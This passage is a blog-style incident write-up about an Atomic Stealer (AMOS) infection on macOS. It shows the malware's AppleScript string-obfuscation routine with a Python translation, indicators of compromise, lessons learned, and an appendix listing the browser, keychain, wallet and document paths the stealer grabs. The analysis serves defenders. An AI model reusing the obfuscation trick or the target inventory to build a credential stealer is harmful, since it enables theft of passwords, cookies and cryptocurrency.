+<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-AppleScript" data-lang="AppleScript"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#007020;font-weight:bold">on</span> <span style="color:#bb60d5">cmbnxmjiwwr</span>(<span style="color:#bb60d5">fpwkmuyobijj</span>, <span style="color:#bb60d5">pcjvewnfyml</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>	<span style="color:#007020;font-weight:bold">set</span> <span style="color:#bb60d5">dpruioywaxp</span> <span style="color:#007020;font-weight:bold">to</span> <span style="color:#4070a0">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>	<span style="color:#007020;font-weight:bold">set</span> <span style="color:#bb60d5">mikzetljb</span> <span style="color:#007020;font-weight:bold">to</span> <span style="color:#40a070">1</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>	<span style="color:#007020;font-weight:bold">repeat</span> <span style="color:#007020;font-weight:bold">with</span> <span style="color:#bb60d5">gnodqyefnwb</span> <span style="color:#007020;font-weight:bold">from</span> <span style="color:#40a070">1</span> <span style="color:#007020;font-weight:bold">to</span> <span style="color:#007020">count</span> <span style="color:#007020;font-weight:bold">of</span> <span style="color:#bb60d5">fpwkmuyobijj</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>		<span style="color:#007020;font-weight:bold">set</span> <span style="color:#bb60d5">mikzetljb</span> <span style="color:#007020;font-weight:bold">to</span> (<span style="color:#bb60d5">mikzetljb</span> <span style="color:#666">+</span> (<span style="color:#007020">item</span> <span style="color:#bb60d5">gnodqyefnwb</span> <span style="color:#007020;font-weight:bold">of</span> <span style="color:#bb60d5">pcjvewnfyml</span>)) <span style="color:#007020;font-weight:bold">mod</span> <span style="color:#40a070">9999</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>		<span style="color:#007020;font-weight:bold">set</span> <span style="color:#bb60d5">dpruioywaxp</span> <span style="color:#007020;font-weight:bold">to</span> <span style="color:#bb60d5">dpruioywaxp</span> <span style="color:#666">&amp;</span> (<span style="color:#007020">character</span> <span style="color:#4070a0">id</span> ((<span style="color:#007020">item</span> <span style="color:#bb60d5">gnodqyefnwb</span> <span style="color:#007020;font-weight:bold">of</span> <span style="color:#bb60d5">fpwkmuyobijj</span>) <span style="color:#666">+</span> (<span style="color:#007020">item</span> <span style="color:#bb60d5">gnodqyefnwb</span> <span style="color:#007020;font-weight:bold">of</span> <span style="color:#bb60d5">pcjvewnfyml</span>)))
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>		<span style="color:#007020;font-weight:bold">set</span> <span style="color:#bb60d5">mikzetljb</span> <span style="color:#007020;font-weight:bold">to</span> <span style="color:#bb60d5">mikzetljb</span> <span style="color:#666">+</span> <span style="color:#40a070">1</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>	<span style="color:#007020;font-weight:bold">end</span> <span style="color:#007020;font-weight:bold">repeat</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>	<span style="color:#60add5">return</span> <span style="color:#bb60d5">dpruioywaxp</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span><span style="color:#007020;font-weight:bold">end</span> <span style="color:#bb60d5">cmbnxmjiwwr</span>
+</span></span></code></pre></div><p>This function builds a string by <em>adding</em> the contents of two arrays. If we were to transpose this to Python, it looks something like this:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#007020;font-weight:bold">def</span> <span style="color:#06287e">string_by_adding</span>(a: <span style="color:#007020">list</span>[<span style="color:#007020">int</span>], b: <span style="color:#007020">list</span>[<span style="color:#007020">int</span>]) <span style="color:#666">-&gt;</span> <span style="color:#007020">str</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    out <span style="color:#666">=</span> <span style="color:#4070a0">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    dummy_var <span style="color:#666">=</span> <span style="color:#40a070">1</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    <span style="color:#007020;font-weight:bold">for</span> i <span style="color:#007020;font-weight:bold">in</span> <span style="color:#007020">range</span>(<span style="color:#40a070">0</span>, <span style="color:#007020">len</span>(a)):
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>        dummy_var <span style="color:#666">=</span> (dummy_var <span style="color:#666">+</span> b[i]) <span style="color:#666">%</span> <span style="color:#40a070">9999</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>        out <span style="color:#666">+=</span> <span style="color:#007020">chr</span>(a[i] <span style="color:#666">+</span> b[i])
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>        dummy_var <span style="color:#666">+=</span> <span style="color:#40a070">1</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    <span style="color:#007020;font-weight:bold">return</span> out
+</span></span></code></pre></div><p>Our malware makes these calls all over the place and takes advantage of the fact that AppleScript makes strings executable
+via e.g. <code>shell script (cdftjcxbo({305, 186, 278, 283, 321, 88, 117, 167, 240}, {196, 79, 178, 178, 207, 56, 72, 55, 208}))</code>.</p>
+<p>Here&rsquo;s an example call:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-AppleScript" data-lang="AppleScript"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#bb60d5">cmbnxmjiwwr</span>(
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>    {<span style="color:#40a070">198</span>, <span style="color:#40a070">38</span>, <span style="color:#40a070">31</span>, <span style="color:#40a070">95</span>, <span style="color:#40a070">168</span>, <span style="color:#40a070">35</span>, <span style="color:#40a070">242</span>, <span style="color:#40a070">142</span>, <span style="color:#40a070">28</span>, <span style="color:#40a070">19</span>, <span style="color:#40a070">116</span>, <span style="color:#40a070">3</span>, <span style="color:#40a070">10</span>, <span style="color:#40a070">9</span>, <span style="color:#40a070">163</span>}, 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>    {<span style="color:#666">-</span><span style="color:#40a070">97</span>, <span style="color:#40a070">78</span>, <span style="color:#40a070">66</span>, <span style="color:#40a070">14</span>, <span style="color:#666">-</span><span style="color:#40a070">71</span>, <span style="color:#40a070">80</span>, <span style="color:#666">-</span><span style="color:#40a070">135</span>, <span style="color:#666">-</span><span style="color:#40a070">96</span>, <span style="color:#40a070">77</span>, <span style="color:#40a070">92</span>, <span style="color:#666">-</span><span style="color:#40a070">24</span>, <span style="color:#40a070">31</span>, <span style="color:#40a070">48</span>, <span style="color:#40a070">83</span>, <span style="color:#666">-</span><span style="color:#40a070">129</span>}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>)
+</span></span></code></pre></div><p>This returns a fragmented string of <code>&quot;etamask.io\\\&quot;:\\\&quot;&quot;</code></p>
+<p>Doing this exhaustively for all the strings in the <em>massive</em> malware script feels like a Herculean task. Luckily for us,
+defenders get to play with LLMs too. Claude Opus 4.6 whipped up a Python tool that extracted all the strings and then
+helpfully categorized them into a breakdown (included below in <a href="#appendix-a-what-was-taken">Appendix A</a>). This gave us a good
+way to assess the full blast radius of this incident, even if the full blast radius was horrifying.</p>
+<h1 id="going-atomic">Going Atomic</h1>
+<p>Doing some digging post-incident, I discovered that this appears to be a particular strain of well-known malware <a href="https://www.picussecurity.com/resource/blog/atomic-stealer-amos-macos-threat-analysis">Atomic Stealer</a>. There have been various iterations of this going back to 2023,
+but the gist of it is this:</p>
+<p>Atomic Stealer (also referred to as AMOS - Atomic macOS Stealer) is marketed on Telegram as a Malware-as-a-Service platform, with costs ranging from $1000-$3000 a month. Users get access
+to various binaries as well as a dashboard system to monitor logs and stolen info, but C2 and distribution are up to them.</p>
+<p>Persistence is (relatively) new to AMOS, and previous variants were largely smash-and-grab to avoid triggering system notifications
+when new login items are added.</p>
+<p>Research by other more official firms and not just Some Dude like me shows that this a growing attack vector:</p>
+<ul>
+<li><a href="https://www.darktrace.com/blog/atomic-stealer-darktraces-investigation-of-a-growing-macos-threat">Darktrace research</a></li>
+<li><a href="https://www.sentinelone.com/blog/atomic-stealer-threat-actor-spawns-second-variant-of-macos-malware-sold-on-telegram/">SentinelOne</a></li>
+<li><a href="https://www.picussecurity.com/resource/blog/atomic-stealer-amos-macos-threat-analysis">Picus Security</a></li>
+</ul>
+<p>Additionally, there are lots of links for further reading over at <a href="https://malpedia.caad.fkie.fraunhofer.de/details/osx.amos">malpedia</a>.</p>
+<h1 id="indicators-of-compromise">Indicators of Compromise</h1>
+<p>This is almost certainly an AMOS affiliate campaign - I&rsquo;m not certain that both instances I&rsquo;ve seen were actually the same campaign since we halted
+execution in one case, but the successful execution made references to a campaign ID of <code>wusetail.com</code>, and had <code>avipstudios.com</code> as a fallback
+C2 domain. Data exfiltration happened to <code>38.244.158.103</code> which is located in the Netherlands.</p>
+<p>Darktrace&rsquo;s research also noted an IP located in the Netherlands but on a different ASN. What was the same was the exfiltration path of <code>/api/tasks/&lt;base64 string&gt;</code>.</p>
+<p>Since this is a fairly &ldquo;standard&rdquo; malware, most EDR vendors should have good IOCs in general here.</p>
+<h1 id="lessons-learned">Lessons Learned</h1>
+<p>Overall, this was not nearly as bad as it could have been. While this was an early-stage startup where
+things are typically pretty Wild West, they had overall good practices that really reduced the impact:</p>
+<ul>
+<li>The engineer in question didn&rsquo;t have direct, persistent access to customer data.</li>
+<li>They had a comprehensive list of systems the employee could access, which meant suspending accounts was easy.</li>
+<li>2FA on everything and a password manager (beyond the built in browser one) limited stolen credential impact.</li>
+<li>EDR did identify this in short order, even if it didn&rsquo;t halt execution. This could have gone on for a <em>long</em> time otherwise.</li>
+</ul>
+<p>Incident response plans should assume this kind of compromise is a &ldquo;when&rdquo; not &ldquo;if&rdquo; question, and you should build out your
+IAM and monitoring strategies accordingly.</p>
+<p><strong>And for goodness sake please stop piping <code>curl</code> into <code>bash</code>.</strong></p>
+<h1 id="appendix-a-what-was-taken">Appendix A: What Was Taken</h1>
+<h3 id="browser-data-chromium-based">Browser Data (Chromium-based)</h3>
+<p>The malware targets <strong>12 Chromium-based browsers</strong>, stealing the following files from each profile:</p>
+<table>
+  <thead>
+      <tr>
+          <th>File</th>
+          <th>Contents</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>/Cookies</code> and <code>/Network/Cookies</code></td>
+          <td>Session cookies, authentication tokens</td>
+      </tr>
+      <tr>
+          <td><code>/Login Data</code></td>
+          <td>Saved usernames and passwords</td>
+      </tr>
+      <tr>
+          <td><code>/Web Data</code></td>
+          <td>Autofill data, saved credit cards</td>
+      </tr>
+      <tr>
+          <td><code>/Local Extension Settings/</code></td>
+          <td>Extension data (targeted by extension ID)</td>
+      </tr>
+      <tr>
+          <td><code>/IndexedDB/</code></td>
+          <td>Extension databases</td>
+      </tr>
+      <tr>
+          <td><code>/Local Storage/leveldb/</code></td>
+          <td>Extension local storage</td>
+      </tr>
+      <tr>
+          <td><code>/History</code></td>
+          <td>Browsing history (conditional)</td>
+      </tr>
+  </tbody>
+</table>
+<p><strong>Targeted Chromium browsers:</strong></p>
+<table>
+  <thead>
+      <tr>
+          <th>Browser</th>
+          <th>Profile Path</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Chrome</td>
+          <td><code>Google/Chrome/</code></td>
+      </tr>
+      <tr>
+          <td>Brave</td>
+          <td><code>BraveSoftware/Brave-Browser/</code></td>
+      </tr>
+      <tr>
+          <td>Microsoft Edge</td>
+          <td><code>Microsoft Edge/</code></td>
+      </tr>
+      <tr>
+          <td>Vivaldi</td>
+          <td><code>Vivaldi/</code></td>
+      </tr>
+      <tr>
+          <td>Opera</td>
+          <td><code>com.operasoftware.Opera/</code></td>
+      </tr>
+      <tr>
+          <td>Opera GX</td>
+          <td><code>com.operasoftware.OperaGX/</code></td>
+      </tr>
+      <tr>
+          <td>Chrome Beta</td>
+          <td><code>Google/Chrome Beta/</code></td>
+      </tr>
+      <tr>
+          <td>Chrome Canary</td>
+          <td><code>Google/Chrome Canary</code></td>
+      </tr>
+      <tr>
+          <td>Chrome Dev</td>
+          <td><code>Google/Chrome Dev/</code></td>
+      </tr>
+      <tr>
+          <td>Chromium</td>
+          <td><code>Chromium/</code></td>
+      </tr>
+      <tr>
+          <td>Arc</td>
+          <td><code>Arc/User Data/</code></td>
+      </tr>
+      <tr>
+          <td>CocCoc</td>
+          <td><code>CocCoc/Browser/</code></td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="browser-data-firefox-based">Browser Data (Firefox-based)</h3>
+<p>For Firefox and Waterfox, it steals:</p>
+<table>
+  <thead>
+      <tr>
+          <th>File</th>
+          <th>Contents</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>/cookies.sqlite</code></td>
+          <td>Cookies</td>
+      </tr>
+      <tr>
+          <td><code>/formhistory.sqlite</code></td>
+          <td>Form autofill history</td>
+      </tr>
+      <tr>
+          <td><code>/key4.db</code></td>
+          <td>Encryption keys for saved passwords</td>
+      </tr>
+      <tr>
+          <td><code>/logins.json</code></td>
+          <td>Encrypted saved passwords</td>
+      </tr>
+      <tr>
+          <td><code>/places.sqlite</code></td>
+          <td>Bookmarks and history (conditional)</td>
+      </tr>
+  </tbody>
+</table>
+<p>It also specifically searches Firefox profiles for the <strong>MetaMask</strong> extension (<code>webextension@metamask.io</code>) and copies its IDB storage if found.</p>
+<h3 id="targeted-browser-extension-ids-321-total">Targeted Browser Extension IDs (321 total)</h3>
+<p>The <code>xsaqtqzhnj</code> property contains <strong>321 Chrome extension IDs</strong>. When found in a browser profile&rsquo;s <code>Local Extension Settings</code> or <code>IndexedDB</code> directories, their data is exfiltrated. These are almost certainly <strong>cryptocurrency wallet extensions</strong>, including but not limited to MetaMask and similar wallet/DeFi extensions. The malware checks for these extension IDs across all Chromium browser profiles.</p>
+<h3 id="cryptocurrency-wallet-applications">Cryptocurrency Wallet Applications</h3>
+<p>The malware specifically targets standalone wallet applications:</p>
+<table>
+  <thead>
+      <tr>
+          <th>Wallet</th>
+          <th>Path Stolen</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Electrum</td>
+          <td><code>~/.electrum/wallets/</code></td>
+      </tr>
+      <tr>
+          <td>Coinomi</td>
+          <td><code>Coinomi/wallets/</code></td>
+      </tr>
+      <tr>
+          <td>Exodus</td>
+          <td><code>Exodus/</code></td>
+      </tr>
+      <tr>
+          <td>Atomic Wallet</td>
+          <td><code>atomic/Local Storage/leveldb/</code></td>
+      </tr>
+      <tr>
+          <td>Wasabi Wallet</td>
+          <td><code>~/.walletwasabi/client/Wallets/</code></td>
+      </tr>
+      <tr>
+          <td>Ledger Live</td>
+          <td><code>Ledger Live/</code></td>
+      </tr>
+      <tr>
+          <td>Monero</td>
+          <td><code>~/Monero/wallets/</code></td>
+      </tr>
+      <tr>
+          <td>Bitcoin Core</td>
+          <td><code>Bitcoin/wallets/</code></td>
+      </tr>
+      <tr>
+          <td>Litecoin Core</td>
+          <td><code>Litecoin/wallets/</code></td>
+      </tr>
+      <tr>
+          <td>Dash Core</td>
+          <td><code>DashCore/wallets/</code></td>
+      </tr>
+      <tr>
+          <td>Electrum-LTC</td>
+          <td><code>~/.electrum-ltc/wallets/</code></td>
+      </tr>
+      <tr>
+          <td>Electron Cash</td>
+          <td><code>~/.electron-cash/wallets/</code></td>
+      </tr>
+      <tr>
+          <td>Guarda</td>
+          <td><code>Guarda/</code></td>
+      </tr>
+      <tr>
+          <td>Dogecoin Core</td>
+          <td><code>Dogecoin/wallets/</code></td>
+      </tr>
+      <tr>
+          <td>Trezor Suite</td>
+          <td><code>@trezor/suite-desktop/</code></td>
+      </tr>
+      <tr>
+          <td>Sparrow</td>
+          <td><code>~/.sparrow/wallets/</code></td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="hardware-wallet-application-data">Hardware Wallet Application Data</h3>
+<p>The malware checks if these apps are installed and extracts their application data:</p>
+<ul>
+<li><strong>Ledger Wallet</strong> — checks <code>/Applications/Ledger Wallet.app</code></li>
+<li><strong>Trezor Suite</strong> — checks <code>/Applications/Trezor Suite.app</code></li>
+<li><strong>Exodus</strong> — checks <code>/Applications/Exodus.app</code></li>
+</ul>
+<p>For each, it creates marker files, writes a configuration payload, and copies wallet data directories.</p>
+<h3 id="safari-data">Safari Data</h3>
+<ul>
+<li><code>~/Library/Cookies/Cookies.binarycookies</code> — Safari cookies</li>
+<li><code>~/Library/Containers/com.apple.Safari/Data/Library/Cookies/Cookies.binarycookies</code> — Sandboxed Safari cookies</li>
+<li><code>~/Library/Safari/Form Values</code> — Safari autofill form data</li>
+</ul>
+<h3 id="apple-notes">Apple Notes</h3>
+<p>Uses AppleScript&rsquo;s <code>Notes</code> application interface to:</p>
+<ul>
+<li>Enumerate all accounts and notes</li>
+<li>Extract creation date and body of every note</li>
+<li>Save to <code>FileGrabber/notes.html</code> with note count header</li>
+<li>Also copies the raw NoteStore SQLite databases:
+<ul>
+<li><code>NoteStore.sqlite</code></li>
+<li><code>NoteStore.sqlite-shm</code></li>
+<li><code>NoteStore.sqlite-wal</code></li>
+</ul>
+</li>
+<li>Copies note media attachments (up to 30 MB)</li>
+</ul>
+<h3 id="keychain">Keychain</h3>
+<ul>
+<li>Copies the user&rsquo;s keychain directory identified by hardware UUID</li>
+<li>The hardware UUID is obtained via: <code>system_profiler SPHardwareDataType | awk &quot;/UUID/ { print $3 }&quot;</code></li>
+</ul>
+<h3 id="telegram-data">Telegram Data</h3>
+<ul>
+<li>Copies from <code>Telegram Desktop/tdata/</code></li>
+<li>Specifically targets <code>key_datas</code> login file</li>
+<li>Searches for paired files (e.g., a file and its <code>s</code> suffix counterpart)</li>
+<li>Output stored in <code>Telegram Data/</code> directory</li>
+</ul>
+<h3 id="openvpn-data">OpenVPN Data</h3>
+<ul>
+<li>Copies from <code>OpenVPN Connect/profiles/</code></li>
+</ul>
+<h3 id="personal-documents-filegrabber">Personal Documents (FileGrabber)</h3>
+<p>Scans <strong>Desktop</strong> and <strong>Documents</strong> folders for files with these extensions (up to 30 MB total):</p>
+<table>
+  <thead>
+      <tr>
+          <th>Extension</th>
+          <th>Type</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>.txt</code></td>
+          <td>Text files</td>
+      </tr>
+      <tr>
+          <td><code>.pdf</code></td>
+          <td>PDF documents</td>
+      </tr>
+      <tr>
+          <td><code>.docx</code></td>
+          <td>Word documents</td>
+      </tr>
+      <tr>
+          <td><code>.doc</code></td>
+          <td>Legacy Word documents</td>
+      </tr>
+      <tr>
+          <td><code>.rtf</code></td>
+          <td>Rich text files</td>
+      </tr>
+      <tr>
+          <td><code>.key</code></td>
+          <td>Key files</td>
+      </tr>
+      <tr>
+          <td><code>.keys</code></td>
+          <td>Key files</td>
+      </tr>
+      <tr>
+          <td><code>.wallet</code></td>
+          <td>Wallet files</td>
+      </tr>
+      <tr>
+          <td><code>.kdbx</code></td>
+          <td>KeePass databases</td>
+      </tr>
+      <tr>
+          <td><code>.jpeg</code> / <code>.jpg</code></td>
+          <td>Photos</td>
+      </tr>
+      <tr>
+          <td><code>.png</code></td>
+          <td>Images</td>
+      </tr>
+      <tr>
+          <td><code>.seed</code></td>
+          <td>Seed phrase files</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="other-data-collected">Other Data Collected</h3>
+<ul>
+<li><strong>Installed applications list</strong> — enumerates <code>/Applications</code></li>
+<li><strong>System profile</strong> — hardware, software, display information</li>
+<li><strong>Mounted volumes</strong> — lists connected drives</li>
+</ul>
+
+</content>
+
+
+
+<p>
+  
+</p>
+
+  </main>
+  <footer>Made with <a href="https://github.com/janraasch/hugo-bearblog/">Hugo ʕ•ᴥ•ʔ Bear</a>
+<br><small>Views expressed are my own and do not represent those of my employer.</small>
+</footer>
+
+  
+</body>
+
+</html>
